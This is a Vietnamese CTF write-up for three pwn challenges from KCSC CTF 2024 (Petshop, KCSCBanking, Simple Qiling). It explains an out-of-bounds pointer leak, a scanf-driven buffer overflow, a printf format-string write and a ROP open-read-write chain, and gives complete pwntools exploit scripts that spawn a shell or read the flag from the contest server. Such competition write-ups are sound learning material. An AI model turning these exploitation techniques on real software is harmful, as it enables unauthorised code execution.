---
title: Write-up PWN KCSC CTF 2024
date: 2024-05-13 15-01-56
categories: [CTF]
tags: [pwn, KCSC]
image: /assets/image/kcsc.png
math: true
private: true
---

## Petshop

### Ý tưởng

- Sử dụng OOB để leak exe.address --> sử dụng bug fmt của `scanf` để BOF leak libc.address --> tiếp tục sử dụng bug fmt của `scanf` để ret2libc

### Phân tích

#### Leak exe.address

- Ở chall này, thì đầu tiên ta có bug OOB ở hàm `buy`

```c
int v6; // [rsp+1Ch] [rbp-424h] BYREF
...
if ( (unsigned int)__isoc99_sscanf(a1, "%3s %d", s1, &v6) != 2 )
...
if ( v6 > 3 )
    {
      puts("Invalid type of dog!");
      v2 = pet_list;
      pet_list[pet_count] = 0LL;
      return (int)v2;
    }
    *(_QWORD *)pet_list[pet_count] = (&dogs)[v6];// leak
```

- Chall không check điều kiện `v6 < 0` nên ta có thể tìm con trỏ để leak exe.address và có 1 con trỏ chúng ta có thể sử dụng được

![](/assets/2024-05-13-Write-up%20PWN%20KCSC%20CTF%202024/2024-05-13-15-27-32.png)

```c
buy(-2)
infoo()
p.recvuntil(b'1. ')
exe.address = u64(p.recv(6) + b'\0\0') - 0x4008
info("exe.address " + hex(exe.address))
```

#### Leak libc.address bằng BOF ở bug fmt của scanf

- Sau khi mình tìm hiểu ở [pwn> scanf and hateful dot](https://rehex.ninja/posts/scanf-and-hateful-dot/) thì mình hiểu như sau. Với `%d` và mình sử dụng `.` thì sẽ không ghi vào biến. Nghĩa là nếu lần đầu tiên mình sửa dụng `scanf` nhập vào `1234` và lần thứ hai mình nhập `.` thì biến đó vẫn có giá trị là `1234`

```c
pop_rdi = exe.address + 0x0000000000001a13
buy(0)
sell(0)
sla(b'You    --> ', str(0x300))
sell(1)
sa(b'You    --> ', '.')
sla(b'You    --> ', b'a'*0x200 + flat(0, pop_rdi,
    exe.got.puts, exe.plt.puts, exe.sym.main))
p.recvuntil(b'That seems reasonable!\n')
libc.address = u64(p.recv(6) + b'\0\0') - libc.sym.puts
info("libc.address: " + hex(libc.address))
```

#### RET2LIBC

```c
buy(-2)
buy(0)
sell(2)
sla(b'You    --> ', str(0x300))
sell(3)
sa(b'You    --> ', '.')
sla(b'You    --> ', b'a'*0x200 + flat(0, pop_rdi+1, pop_rdi,
    next(libc.search(b'/bin/sh')), libc.sym.system))
```

### Script

- - `KCSC{0h_n0_0ur_p3t_h4s_bug?!????????????????????}`

```python
#!/usr/bin/python3

from pwn import *

exe = ELF('petshop_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                brva 0x1637

                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('103.163.24.78', 10001)
else:
    p = process(exe.path)


def buy(idx):
    sla(b'You    --> ', 'buy cat ' + str(idx))
    sla(b'You    --> ', b'wan')


def sell(idx):
    sla(b'You    --> ', 'sell ' + str(idx))


def infoo():
    sla(b'You    --> ', 'info mine')


buy(-2)
infoo()
p.recvuntil(b'1. ')
exe.address = u64(p.recv(6) + b'\0\0') - 0x4008
info("exe.address " + hex(exe.address))

pop_rdi = exe.address + 0x0000000000001a13
buy(0)
sell(0)
sla(b'You    --> ', str(0x300))
sell(1)
sa(b'You    --> ', '.')
sla(b'You    --> ', b'a'*0x200 + flat(0, pop_rdi,
    exe.got.puts, exe.plt.puts, exe.sym.main))
p.recvuntil(b'That seems reasonable!\n')
libc.address = u64(p.recv(6) + b'\0\0') - libc.sym.puts
info("libc.address: " + hex(libc.address))
GDB()

buy(-2)
buy(0)
sell(2)
sla(b'You    --> ', str(0x300))
sell(3)
sa(b'You    --> ', '.')
sla(b'You    --> ', b'a'*0x200 + flat(0, pop_rdi+1, pop_rdi,
    next(libc.search(b'/bin/sh')), libc.sym.system))


p.interactive()

```

## KCSCBanking

### Ý tưởng

- Sử dụng fmt để get shell

### Phân tích

- Ta có bug fmt ở hàm `info`

```c
int info()
{
  printf(name);
  return printf("Money: %u\n", (unsigned int)bank);
}
```

- Khi mình đặt breakpoint ở `print(name)` thì trong stack như sau

  ![](/assets/2024-05-13-Write-up%20PWN%20KCSC%20CTF%202024/2024-05-13-15-48-47.png)

- Như vậy password mình sẽ đưa vào các địa chỉ và username mình sẽ dùng %n để ghi vào các địa chỉ ấy

#### script

- `KCSC{st1ll_buff3r_0v3rfl0w_wh3n_h4s_c4n4ry?!?}`

```python
#!/usr/bin/python3

from pwn import *

exe = ELF('banking_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                brva 0x1656

                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('103.163.24.78', 10002)
else:
    p = process(exe.path)

GDB()


def reg(name, passs='a'):
    sla(b'> ', b'2')
    sla(b': ', b'aaaaaaaa')
    sla(b': ', passs)
    sla(b': ', name)


def login(passs='a'):
    sla(b'> ', b'1')
    sla(b': ', b'aaaaaaaa')
    sla(b': ', passs)


def infoo():
    sla(b'> ', b'3')


def out():
    sla(b'> ', b'4')
    sla(b': ', b'2')


# leak libc, stack
reg("%49$p|%6$p|")
login()
infoo()
libc.address = int(p.recvuntil(b"|", drop=True), 16) - 0x23a90
stack = int(p.recvuntil(b"|", drop=True), 16) + 0x28
info("libc.addres: " + hex(libc.address))
info("libc.addres: " + hex(stack))
pop_rdi = 0x00000000000240e5 + libc.address
ret = pop_rdi + 1
binsh = next(libc.search(b'/bin/sh'))
system = libc.sym.system

# write ret
package = {
    ret & 0xffff: stack,
    ret >> 16 & 0xffff: stack+2,
    ret >> 32 & 0xffff: stack+4,
}
order = sorted(package)

pa1 = p64(package[order[0]]) + p64(package[order[1]]) + p64(package[order[2]])
pa2 = f'%{order[0]}c%20$hn%{order[1]-order[0]}c%21$hn%{order[2]-order[1]}c%22$hn'.encode()
out()
reg(pa2, pa1)
login(pa1)
infoo()
stack += 8
# write pop rdi
package = {
    pop_rdi & 0xffff: stack,
    pop_rdi >> 16 & 0xffff: stack+2,
    pop_rdi >> 32 & 0xffff: stack+4,
}
order = sorted(package)

pa1 = p64(package[order[0]]) + p64(package[order[1]]) + p64(package[order[2]])
pa2 = f'%{order[0]}c%20$hn%{order[1]-order[0]}c%21$hn%{order[2]-order[1]}c%22$hn'.encode()
out()
reg(pa2, pa1)
login(pa1)
infoo()

stack += 8
# write binsh
package = {
    binsh & 0xffff: stack,
    binsh >> 16 & 0xffff: stack+2,
    binsh >> 32 & 0xffff: stack+4,
}
order = sorted(package)

pa1 = p64(package[order[0]]) + p64(package[order[1]]) + p64(package[order[2]])
pa2 = f'%{order[0]}c%20$hn%{order[1]-order[0]}c%21$hn%{order[2]-order[1]}c%22$hn'.encode()
out()
reg(pa2, pa1)
login(pa1)
infoo()

stack += 8
# write system
package = {
    system & 0xffff: stack,
    system >> 16 & 0xffff: stack+2,
    system >> 32 & 0xffff: stack+4,
}
order = sorted(package)

pa1 = p64(package[order[0]]) + p64(package[order[1]]) + p64(package[order[2]])
pa2 = f'%{order[0]}c%20$hn%{order[1]-order[0]}c%21$hn%{order[2]-order[1]}c%22$hn'.encode()
out()
reg(pa2, pa1)
login(pa1)
infoo()
# get shell
sla(b'> ', b'3')
out()
sla(b'> ', b'3')

p.interactive()

```

## Simple Qiling

### Ý tưởng

- Qiling là một máy ảo khá tương tự QEMU, do vậy cũng có một điều lạ khi và cần debug
- `Open-Read-Write`

### Phân tích

- Đầu tiên mình sửa file `qi.py` để có thể debug

```python
#!/usr/bin/env python3
import qiling
from qiling.const import QL_VERBOSE
import sys

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <ELF>")
        sys.exit(1)
    cmd = [sys.argv[1]]
    ql = qiling.Qiling(cmd, console=False, rootfs='.', verbose=QL_VERBOSE.OFF)
    ql.debugger = True
    ql.debugger = "gdb:127.0.0.1:9999"
    ql.run()
```

- File solve.py

```python
#!/usr/bin/python3

from pwn import *

exe = ELF('simpleqiling_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('103.163.24.78', 10010)
else:
    p = process("python3 qi.py simpleqiling_patched".split())

# GDB()
pa = b'a'*8*5
sa(b'say', pa)

##########

p.interactive()
```

- Ban đầu mình dùng gdb để remote debug nhưng không được nên mình thử debug bằng IDA

  ![](/assets/2024-05-13-Write-up%20PWN%20KCSC%20CTF%202024/2024-05-13-15-58-19.png)

- Mình thử gửi 40 byte 'a' và xem stack như thế nào.

  ![](/assets/2024-05-13-Write-up%20PWN%20KCSC%20CTF%202024/2024-05-13-16-30-24.png)

- Mình thấy khá giống QEMU ở chỗ pie tắt, canary phụ thuộc vào các byte mình nhập
- Và do pie tắt, mình tìm được các gadget có ích sau

```python
libc.address = 0x00007FFFB7DFA083-0x24083
pop_rdi = 0x555555554000 + 0x0000000000001473
pop_rsi_r15 = 0x0000000000001471 + 0x555555554000
pop_rdx = libc.address + 0x0000000000142c92
pop_rax = libc.address + 0x0000000000036174
pltputs = 0x5555555550a0
pltread = 0x5555555550d0
main = 0x555555555314
syscall = libc.address + 0x00000000000630a9
```

- Đến đây mình có ý tưởng mình sẽ read `flag.txt` vào environ và open-read-write. Do trong giải mình thử một số cách khác nhưng không được và gặp khá nhiều lỗi.

### script

- `KCSC{q3mu_vs_q1l1ng_wh1ch_1_1s_b3tt3r}`

```python
#!/usr/bin/python3

from pwn import *

exe = ELF('simpleqiling_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('103.163.24.78', 10010)
else:
    p = process("python3 qi.py simpleqiling_patched".split())

# GDB()
libc.address = 0x00007FFFB7DFA083-0x24083
pop_rdi = 0x555555554000 + 0x0000000000001473
pop_rsi_r15 = 0x0000000000001471 + 0x555555554000
pop_rdx = libc.address + 0x0000000000142c92
pop_rax = libc.address + 0x0000000000036174
pltputs = 0x5555555550a0
pltread = 0x5555555550d0
main = 0x555555555314
syscall = libc.address + 0x00000000000630a9
pa = b'a'*8*5 + p64(0x6161616161616100)
pa += flat(0,
           # read
           pop_rdi+1,
           pop_rdi, 0,
           pop_rsi_r15, libc.sym.environ, 0,
           pop_rdx, 0x10,
           pltread,
            # open
           pop_rdi, libc.sym.environ,
           pop_rax, 0x2,
           pop_rsi_r15, 0, 0,
           pop_rdx, 0,
           syscall,
           main)
sa(b'say', pa)
print(len(pa))
sleep(1)
s(b'./flag.txt\0')
##########
pa = b'a'*8*5 + p64(0x6161616161616100)
pa += flat(0,
           pop_rdi+1,
           pop_rdi, 3,
           pop_rsi_r15, libc.sym.environ, 0,
           pop_rdx, 0x100,
           pltread,

           pop_rdi, 1,
           pop_rax, 0x1,
           pop_rsi_r15, libc.sym.environ, 0,
           pop_rdx, 0x100,
           syscall,

           main
           )
sa(b'say', pa)
p.interactive()
```
